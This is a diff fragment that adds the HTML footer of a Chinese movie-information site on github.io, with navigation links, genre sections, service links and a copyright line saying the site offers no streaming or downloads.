+      <div>
+        <h5>栏目导览</h5>
+        <ul>
+          <li><a href="#search">检索台</a></li>
+          <li><a href="#cat">类型总表</a></li>
+          <li><a href="#era">年代巡礼</a></li>
+          <li><a href="#rank">榜单中心</a></li>
+          <li><a href="#bench">选片工作台</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>类型分区</h5>
+        <ul>
+          <li><a href="#">喜剧 · 动作 · 爱情</a></li>
+          <li><a href="#">悬疑 · 科幻 · 动画</a></li>
+          <li><a href="#">纪录 · 文艺</a></li>
+          <li><a href="#">经典档案</a></li>
+          <li><a href="#">新片速递</a></li>
+        </ul>
+      </div>
+      <div>
+        <h5>本站服务</h5>
+        <ul>
+          <li><a href="#">投稿与补充</a></li>
+          <li><a href="#">资料纠错</a></li>
+          <li><a href="#">观影指南</a></li>
+          <li><a href="#">RSS 订阅</a></li>
+          <li><a href="#">合作洽谈</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="copy">
+      © 2026 免费最全电影网 mianfeizuiquandianyingwang-wap.github.io 版权所有 · 本站为电影资料与观影指南类站点，不提供影片在线观看、下载或资源链接服务，观影请通过合法授权渠道<br>
+      网站名称：<a href="https://mianfeizuiquandianyingwang-wap.github.io/">免费最全电影网</a> ｜ 网站网址：https://mianfeizuiquandianyingwang-wap.github.io/
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
